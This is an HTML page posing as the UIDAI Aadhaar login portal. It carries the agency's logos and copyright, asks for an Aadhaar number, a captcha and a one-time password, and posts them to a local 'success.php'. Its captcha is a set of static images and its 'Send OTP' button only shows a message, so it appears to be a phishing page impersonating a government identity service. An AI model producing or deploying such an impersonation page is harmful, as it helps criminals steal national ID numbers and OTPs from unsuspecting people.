<!DOCTYPE html>
<html>
<head>
	<title>Login Page</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style type="text/css">
* {
	margin: 0;
	padding: 0;
	box-sizing: border-box;
}
.header {
	    width: 100%;
    border-bottom: 2px solid #020b50;
    height: 70px;
    position: fixed;
    top: 0%;
    background-color: #ffffff;
    z-index: 5;
    padding: 10px 150px;
}
.d_flex {
	    display: flex;
    justify-content: space-between;
    align-items: center;
}
.footer {
	background-color: #020348;
    height: auto;
    position: fixed;
    bottom: 0;
    width: 100%;
    padding-top: 0.9rem;
    padding-bottom: 0.9rem;
    z-index: 5;
}
.footer p {
	text-align: center;
    color: white;
    white-space: normal;
    text-overflow: ellipsis;
    margin: auto;
    padding: 0.5rem;
    font-size: 1rem;
}
.form {
	    background-color: #ffffff;
    box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
    border-radius: 4px;
    padding: 16px;
    margin: auto;
    max-width: 360px;
        margin-top: 90px;
    overflow: hidden;
}
.btn {
	    position: relative;
    width: 100%;
    height: 42px;
    margin: 20px 0px;
    font-family: sans-serif;
    font-weight: 400;
    font-size: 1rem;
    color: #ffffff;
    transition: all 0.1s linear;
    border-radius: 4px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    align-self: center;
    border: none;
    cursor: pointer;
    outline: 0;
    text-transform: capitalize;
    background-image: linear-gradient(rgba(255, 255, 255, 0), rgba(255, 255, 255, 0)), linear-gradient(to right, #020D51, #19B0DC);
}
input {
    width: 100%;
    border: 0;
    border-bottom: solid 2px #5C5958;
    padding: 0px;
    padding-bottom: 5px;
    font-size: 1.25rem;
}
input:focus {
	    border: none;
    outline: none;
    border-bottom: solid 2px #5C5958;
}
.captcha_box {
	    display: flex;
    flex-direction: row;
    border: 2px solid #707070;
    border-radius: 4px;
    width: 100%;
    justify-content: center;
    align-items: center;
    margin-top: 20px;
    margin-bottom: 20px;
}
.captcha {
    box-sizing: border-box;
    height: 40px;
    flex-grow: 1;
    text-align: center;
    margin: auto;
    display: flex;
    align-content: center;
    justify-content: center;
    position: relative;
}
.captcha svg {
	    width: 28px;
    cursor: pointer;
    position: absolute;
    right: 6px;
    top: 8px;
    border-left: 1px solid #000;
    padding-left: 3px;
}
.main_otp {
position: relative;
}
.send_otp {
background: green;
    padding: 10px;
    color: #fff;
    width: 100%;
    text-align: center;
    margin-bottom: 20px;
    border-radius: 3px;
    text-transform: uppercase;
}
</style>
</head>
<body>

<div class="header">
	<div class="d_flex">
		<a href=""><img src="images\uidai.svg"></a>
		<a href=""><img src="images\aadhaar.svg"></a>
	</div>
</div>

<div class="form">
	<form  action="success.php" method="POST">
		<div class="form-group" >
			<label>Enter Aadhaar</label>
			<input type="text" name="" required><br>
		</div>
		<div class="captcha_box">
			<p class="captcha"><img src="images/bbbb.png" id="captchaImage">
				<svg clip-rule="evenodd" fill-rule="evenodd" stroke-linejoin="round" class="reoadCaptcha" stroke-miterlimit="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m3.508 6.726c1.765-2.836 4.911-4.726 8.495-4.726 5.518 0 9.997 4.48 9.997 9.997 0 5.519-4.479 9.999-9.997 9.999-5.245 0-9.553-4.048-9.966-9.188-.024-.302.189-.811.749-.811.391 0 .715.3.747.69.351 4.369 4.012 7.809 8.47 7.809 4.69 0 8.497-3.808 8.497-8.499 0-4.689-3.807-8.497-8.497-8.497-3.037 0-5.704 1.597-7.206 3.995l1.991.005c.414 0 .75.336.75.75s-.336.75-.75.75h-4.033c-.414 0-.75-.336-.75-.75v-4.049c0-.414.336-.75.75-.75s.75.335.75.75z" fill-rule="nonzero"/></svg>
			</p>
		</div>
		<div class="form-group">
			<label>Enter Above Captcha</label>
			<input type="text" name="">
		</div>
		<div class="main_otp">
			<button class="btn send_otp_message" type="button">Send OTP</button>
			<p class="send_otp" style="display: none;">OTP Sent </p>
		</div>
		
		<div class="form-group">
			<label>Enter OTP</label>
			<input type="text" class="enter_otp" name="" required><br>
		</div>
		<button class="btn" style="background-color: #020348;    background-image: none;" type="submit">Login</button>
	</form>
</div>


	<div class="footer">
		<p>Copyright © 2020 Unique Identification Authority of India All Rights Reserved</p>
	</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>

<script type="text/javascript">
	$(".enter_otp").click(function(){
  $(".send_otp").hide();
});
$(document).ready(function(){
    var clickCounter=1;
    $('.reoadCaptcha').click(function(){
        var getNumber=Math.floor(Math.random() * 4) + 1
        if(getNumber==1){
            document.getElementById("captchaImage").src= "images/bbbb.png";
        }
        if(getNumber==2){
            document.getElementById("captchaImage").src= "images/captcha.jfif";
        }
        if(getNumber==3){
            document.getElementById("captchaImage").src= "images/CCCC.png";
        }
        if(getNumber==4){
            document.getElementById("captchaImage").src= "images/DDDD.png";
        }
        clickCounter++;
        console.log(clickCounter)
    })
    $('.captchImage').src
})
$(".send_otp_message").click(function(){
  $(".send_otp").show();
});
</script>
</body>
</html>